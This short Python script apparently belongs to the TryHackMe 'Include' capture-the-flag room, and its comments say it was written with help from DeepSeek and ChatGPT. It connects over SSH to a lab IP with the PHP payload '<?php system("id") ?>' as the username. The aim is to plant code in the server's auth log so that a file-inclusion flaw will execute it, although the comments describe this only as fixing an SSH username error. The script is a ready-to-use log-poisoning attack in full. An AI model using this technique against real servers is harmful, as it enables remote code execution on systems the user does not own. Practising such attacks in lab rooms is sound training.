# script fro tryhackme room Include https://tryhackme.com/room/include
# script with assistance of DeepSeek and ChatGPT
# this script to fix ssh error: remote username contains invalid characters

import warnings
from cryptography.utils import CryptographyDeprecationWarning

# Suppress deprecation warnings before importing paramiko
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import paramiko

# Create an SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Connect to the server
try:
    ssh.connect('10.10.235.157', username='<?php system("id") ?>', password='')
    print("Connected successfully!")
except Exception as e:
    print(f"Connection failed: {e}")
finally:
    ssh.close()
